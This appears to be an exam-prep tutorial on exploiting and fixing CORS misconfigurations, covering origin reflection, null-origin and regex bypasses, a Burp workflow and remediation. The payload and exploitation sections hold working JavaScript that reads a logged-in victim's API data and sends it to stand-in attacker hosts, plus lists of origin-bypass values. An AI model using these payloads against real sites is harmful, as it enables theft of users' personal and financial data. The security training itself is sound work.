CORS Misconfiguration

Exploit misconfigured Cross-Origin Resource Sharing to steal sensitive data from authenticated sessions across origins.

High BSCP Exam Topic Difficulty: Beginner-Intermediate

Real-World Analogy

The Forgetful Bouncer

Your house has a security policy: "Only let in people I've pre-approved." But you wrote it down as: "Let in anyone who says they know me" or "Let in whoever claims to be coming from my house." A social engineer shows up and says they're from your house, and the bouncer lets them in. They walk straight to your safe and steal your valuables. CORS misconfiguration works the same way: a website says "I trust requests from origin X" but dynamically reflects whatever origin you send, or trusts dangerously broad patterns. An attacker's website sends a request on behalf of your session, and because the target site trusts all origins (or reflects the attacker's origin), the response includes your sensitive data.

🎯 Day 3 · CORS Testing

On Day 3, test CORS on every API endpoint that returns user data. The attack only works when both conditions are true: Access-Control-Allow-Origin reflects/trusts your origin AND Access-Control-Allow-Credentials: true is set. Add an Origin: header to requests in Repeater and check the response:

# Test 1: arbitrary origin reflection
Origin: https://evil.com
→ Does response include: Access-Control-Allow-Origin: https://evil.com?
→ AND: Access-Control-Allow-Credentials: true?

# Test 2: null origin (sandboxed iframe bypass)
Origin: null
→ Does response allow null with credentials?

# Test 3: subdomain trust + prefix/suffix regex flaws
Origin: https://evil.target.com
Origin: https://target.com.evil.com
Origin: https://target.com.evil.com

If both ACAO reflects and ACAC is true → build JavaScript PoC that fetches /api/user from an attacker page while including victim's cookies.

Chain it: CORS + XSS on any trusted subdomain → steal authenticated API responses → account data exfiltration.

How It Works

Same-Origin Policy is a browser security boundary: scripts from one origin cannot access resources from another origin without explicit permission. CORS (Cross-Origin Resource Sharing) allows servers to explicitly permit cross-origin requests by sending specific HTTP headers.

The CORS Handshake

When a browser makes a cross-origin request (e.g., JavaScript on attacker.com fetching from victim.com), it:

  1. Sends a preflight request (OPTIONS) with the Origin header
  2. The server responds with Access-Control-Allow-Origin and other CORS headers
  3. If the response permits the origin, the browser allows the actual request
  4. If the server includes Access-Control-Allow-Credentials: true, the browser sends cookies with the request

Key CORS Headers

  • Access-Control-Allow-Origin (ACAO): Which origins can access the response. Values: specific origin, wildcard *, or null
  • Access-Control-Allow-Credentials (ACAC): Whether credentials (cookies, HTTP auth) are included. Values: true or false
  • Vary: Origin: Instructs caches to store separate responses per origin (if omitted, cache poisoning may occur)
  • Access-Control-Allow-Methods: Which HTTP methods (GET, POST, etc.) are permitted
  • Access-Control-Allow-Headers: Which custom headers are permitted

Vulnerability Pattern 1: Reflecting the Origin Header

The server echoes whatever Origin header you send back in the Access-Control-Allow-Origin response header:

// Request from attacker.com
Origin: https://attacker.com

// Response
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

// Result: Attacker's site can read authenticated responses

Vulnerability Pattern 2: Null Origin Trust

The server trusts ACAO: null, which is sent by sandboxed iframes:

// Sandboxed iframe sends
Origin: null

// Server responds
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

// Attacker uses sandboxed iframe to steal data

Vulnerability Pattern 3: Subdomain Wildcards

The server trusts all subdomains without properly validating them:

// Server trusts
Access-Control-Allow-Origin: *.example.com

// If XSS exists on any subdomain (cdn.example.com, mail.example.com),
// attacker can steal data from example.com API endpoints

Vulnerability Pattern 4: Regex Flaws

The server uses a flawed regex pattern to validate origins:

// Regex: /allowed\.com$/
// Attacker registers: evil-allowed.com or allowed.com.attacker.com
// Both match the regex, bypassing CORS checks

Where to Look

CORS vulnerabilities appear on API endpoints that handle sensitive data. Test every endpoint that returns user information:

High-Value Targets

  • Account/Profile APIs: /api/user, /api/profile, /api/account
  • Authentication APIs: /api/auth/me, /api/whoami, endpoints that return user identity
  • Financial/Sensitive Data: /api/transactions, /api/balance, /api/settings
  • Admin APIs: Any endpoint protected by authentication that returns sensitive data

Testing Approach

  1. Send a request to an API endpoint (e.g., /api/user)
  2. In Burp Repeater, add an arbitrary Origin: https://evil.com header
  3. Check the response for Access-Control-Allow-Origin and Access-Control-Allow-Credentials headers
  4. If ACAO: https://evil.com AND ACAC: true appear, the endpoint is vulnerable

Red Flags

  • Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true (invalid combination, but server may still allow it)
  • Access-Control-Allow-Origin: null (trusts sandboxed contexts)
  • The Origin header is reflected directly without validation
  • No Vary: Origin header (cache poisoning risk)

Burp Suite Workflow

1
Identify API Endpoints
Use Burp's Proxy history or Scanner to identify API endpoints that return user data. Look for endpoints that require authentication and respond with JSON/sensitive data.
2
Send to Repeater
Select an API request and send it to Repeater (Ctrl+R). Observe the response headers and body. Note if the endpoint returns user data.
3
Modify the Origin Header
Add or modify the Origin header in the request. Try values like https://attacker.com, https://evil.com, or null. Resend the request.
4
Check Response Headers
Look at the response headers for Access-Control-Allow-Origin and Access-Control-Allow-Credentials. If ACAO reflects your origin and ACAC is true, the endpoint is vulnerable.
5
Create a PoC
Write JavaScript code that performs a cross-origin fetch to the vulnerable endpoint. Use Burp Collaborator or host the PoC on your domain to verify that the browser allows the cross-origin request and the response is accessible.
6
Test Subdomain and Regex Patterns
Try registering a subdomain or crafting origin values that might match regex patterns. Check if the server accepts non-whitelisted origins.

Payloads & Techniques

Basic JavaScript PoC (Reflected Origin)

Create an HTML file on your attacker domain that fetches data from the victim site:

<!DOCTYPE html>
<html>
<head>
  <title>CORS Test</title>
</head>
<body>
<script>
fetch('https://victim.com/api/user', {
  method: 'GET',
  credentials: 'include'  // Include cookies
})
.then(response => response.json())
.then(data => {
  // Send stolen data to attacker server
  fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
  console.log('Data stolen:', data);
})
.catch(err => console.error('Error:', err));
</script>
</body>
</html>

Null Origin PoC (Sandboxed Iframe)

If the server trusts null origin, use a sandboxed iframe:

<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <script>
  fetch('https://victim.com/api/user', {credentials: 'include'})
    .then(r => r.text())
    .then(d => fetch('https://attacker.com/steal?data=' + btoa(d)));
  </script>
"></iframe>

Testing Origin Reflections

Use Burp Repeater to test various origin values:

// Test list
Origin: https://attacker.com
Origin: https://evil.com
Origin: https://victim.com.attacker.com
Origin: https://victim.com
Origin: null
Origin: https://victim.com:8080
Origin: http://victim.com  (if site is HTTPS)
Origin: https://*.victim.com  (wildcard attempt)
Origin: *.victim.com

Subdomain Enumeration & Testing

If the server trusts subdomains (*.victim.com), find subdomains with XSS vulnerabilities:

// Use tools like:
// - sublist3r, massdns, assetfinder for subdomain enumeration
// - Test each subdomain for XSS
// - Once XSS found on a subdomain, use it to steal data from main API

// JavaScript on XSS-vulnerable subdomain (e.g., cdn.victim.com)
fetch('https://api.victim.com/user', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(d))));

Cache Poisoning (Missing Vary: Origin)

If Vary: Origin is absent, a CDN may cache responses:

// Request 1: From attacker.com (gets ACAO: attacker.com in response)
// If response is cached without Vary: Origin,
// Victim visits site, sees attacker's Origin in ACAO header
// Browser may trust the response

Testing Regex Patterns

If origin validation uses regex, test patterns that might bypass it:

// If regex is: /allowed\.com$/
Origin: https://evil-allowed.com  // Matches due to .com suffix
Origin: https://allowed.com.attacker.com  // Matches due to allowed.com

// If regex is: /^https:\/\/.*\.allowed\.com$/
Origin: https://attacker.allowed.com  // Matches wildcard
Origin: https://allowed.com  // Might not match (no subdomain)

WAF Bypass & Variations

Origin Header Case Sensitivity

Some WAFs check origin case-sensitively. Try variations:

  • Origin: https://Attacker.com (capital A)
  • Origin: HTTPS://attacker.com (uppercase protocol)

Subdomain/Port Tricks

  • If WAF allows *.victim.com, try victim.com:1.attacker.com (port confusion)
  • Use different ports: https://attacker.com:443 vs http://attacker.com:80
  • Register a lookalike domain: yictim.com (typosquatting)

Unicode/URL Encoding

Try URL-encoded or unicode-encoded origins (unlikely to work, but worth testing):

Origin: https://attacker.com%00.victim.com
Origin: https://attacker。com  (unicode dot)

Bypassing Regex Patterns

If origin validation uses regex, test edge cases:

  • Regex allows victim.com → try victim.com.attacker.com
  • Regex allows subdomains → try attacker.com.victim.com
  • Missing anchors → try xvictim.comx

Protocol Downgrade

If the site is HTTPS, try http:// origin (if HTTP is still accessible):

Origin: http://attacker.com  // If CORS checks are protocol-agnostic

XSS on Trusted Subdomain

Instead of bypassing CORS directly, find XSS on a trusted subdomain and use that to steal data.

Exploitation & Impact

Exploitation Scenarios

Stealing Session Cookies

Use a cross-origin fetch with credentials: 'include' to steal authenticated session data:

fetch('https://victim.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // data contains sensitive user info: email, account balance, etc.
  });

Account Takeover

Steal a user's authentication token or session identifier, then use it to impersonate them on the victim site.

Data Exfiltration

Read user profiles, financial data, personal information, and send it to an attacker-controlled server:

// PoC: Send stolen data to attacker
.then(data => fetch('https://attacker.com/exfil', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
}))

Privilege Escalation

If you can steal an admin's session token or read admin APIs, you can escalate privileges or access restricted functionality.

Cache Poisoning

If Vary: Origin is missing and responses are cached, you can poison a CDN to serve attacker-controlled CORS headers to all users.

Impact Assessment

  • Critical: Stealing session tokens, authentication credentials, or personal data
  • High: Reading user profiles, financial data, or private communications
  • Medium: Reading metadata, cache poisoning, or information disclosure

Real-World Example

A travel booking site stores user payment methods in /api/payment-methods. The endpoint is vulnerable to CORS misconfiguration (reflects Origin header). An attacker creates a malicious website that, when visited by a logged-in user, fetches their payment methods and sends them to the attacker's server. Within hours, dozens of users' payment data is compromised.

Remediation

1. Whitelist Specific Origins (Never Reflect)

Never echo the Origin header directly. Instead, check against a whitelist:

const ALLOWED_ORIGINS = [
  'https://example.com',
  'https://app.example.com'
];

const origin = request.headers.get('Origin');
if (ALLOWED_ORIGINS.includes(origin)) {
  response.headers.set('Access-Control-Allow-Origin', origin);
}

2. Don't Trust Wildcard + Credentials

Never use Access-Control-Allow-Origin: * together with Access-Control-Allow-Credentials: true. The browser will reject this combination.

3. Add Vary: Origin

Always include this header to prevent cache poisoning:

Access-Control-Allow-Origin: https://example.com
Vary: Origin

4. Avoid Wildcard Subdomains

Instead of ACAO: *.example.com, list specific subdomains or validate strictly.

5. Validate Origin with Proper Regex

If using regex, ensure proper anchoring and escaping:

// Good: Anchored regex with escape
const originRegex = /^https:\/\/([\w-]+\.)?example\.com$/;

// Bad: No anchors, vulnerable to bypass
const originRegex = /example\.com/;

6. Disable CORS if Not Needed

If an API endpoint doesn't require cross-origin access, don't send CORS headers at all.

7. Require Same-Site Cookies

Set SameSite=Strict or SameSite=Lax on session cookies to limit CSRF/CORS attacks:

Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly

8. Use CORS Middleware Properly

Libraries like cors (Node.js) require explicit configuration. Never use defaults in production:

// Good: Explicit whitelist
const cors = require('cors');
app.use(cors({
  origin: ['https://example.com', 'https://app.example.com'],
  credentials: true
}));

// Bad: Wildcard (if credentials needed)
app.use(cors());

Common Beginner Mistakes

Not Checking ACAC Header

Mistake: Testing ACAO but ignoring Access-Control-Allow-Credentials.

Fix: Both headers must be present for cookie-based CORS attacks. If ACAC is false/absent, you can't steal authenticated data.

Testing Without Credentials

Mistake: Using fetch(url) instead of fetch(url, {credentials: 'include'}) in your PoC.

Fix: Always include credentials: 'include' when testing. Without it, cookies aren't sent.

Only Testing GET Requests

Mistake: Assuming POST endpoints aren't vulnerable to CORS.

Fix: Test all HTTP methods (GET, POST, PUT, DELETE, PATCH). API endpoints often accept multiple methods.

Giving Up on Regex Testing

Mistake: Testing only direct origin values and not fuzzing subdomain/port patterns.

Fix: Methodically test variations: subdomains, ports, different protocols, unicode, URL encoding.

Not Monitoring Outbound Connections**

Mistake: Creating a PoC but not using Burp Collaborator or server logs to verify data theft.

Fix: Always monitor your attacker server to confirm stolen data is received. Use Burp Collaborator for blind verification.

Overlooking Cache Poisoning**

Mistake: Reporting CORS misconfiguration as a simple data leak, missing cache poisoning risks.

Fix: Check for Vary: Origin header. If absent, note cache poisoning as an amplified impact.

Not Testing Null Origin**

Mistake: Assuming null origin is rare and not testing it.

Fix: Always test with Origin: null and sandboxed iframes. Some sites explicitly trust null.

🔗 See Also · Attack Chains

CORS misconfigurations become critical when combined with client-side vulnerabilities.

⚡XSSXSS on any trusted subdomain completely bypasses CORS restrictions · attacker can make cross-origin API calls as the victim. 🎭CSRFBoth exploit the browser's request-sending behavior. CORS lets you READ the response; CSRF lets you WRITE state · together they're devastating. 🔗OAuthCORS on an OAuth token endpoint leaks access tokens to attacker origins. Combine with redirect_uri bugs. 🏷️Host HeaderSome apps use the Host header to determine allowed CORS origins · a Host header injection can bypass the CORS check.
